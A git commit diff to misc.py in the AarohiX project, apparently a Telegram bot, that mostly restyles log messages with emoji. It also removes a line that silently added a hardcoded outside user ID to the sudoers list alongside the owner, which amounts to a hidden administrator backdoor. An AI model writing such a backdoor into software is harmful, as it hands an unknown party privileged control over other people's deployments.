08c56e933fa9f17e11adf16611b3a058edd370c9
KRISH <168031558+KRISHtg@users.noreply.github.com>
2024-07-04 06:09:55 +0530

    Update misc.py

--- AarohiX/misc.py
+++ AarohiX/misc.py
@@ -39,7 +39,7 @@ XCB = [
 def dbb():
     global db
     db = {}
-    LOGGER(__name__).info(f"Local Database Initialized.")
+    LOGGER(__name__).info(f"✦ Local Database Initialized...💛")
 
 
 async def sudo():
@@ -50,7 +50,6 @@ async def sudo():
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
-        sudoers.append(2107529793)
         await sudoersdb.update_one(
             {"sudo": "sudo"},
             {"$set": {"sudoers": sudoers}},
@@ -59,7 +58,7 @@ async def sudo():
     if sudoers:
         for user_id in sudoers:
             SUDOERS.add(user_id)
-    LOGGER(__name__).info(f"Sudoers Loaded.")
+    LOGGER(__name__).info(f"✦ Sudoers Loaded...❤️")
 
 
 def heroku():
@@ -69,8 +68,8 @@ def heroku():
             try:
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
-                LOGGER(__name__).info(f"Heroku App Configured")
+                LOGGER(__name__).info(f"✦ Heroku App Configured...💙")
             except BaseException:
                 LOGGER(__name__).warning(
-                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
+                    f"✦ Please make sure your Heroku API Key and Your App name are configured correctly in the heroku...💚"
                 )
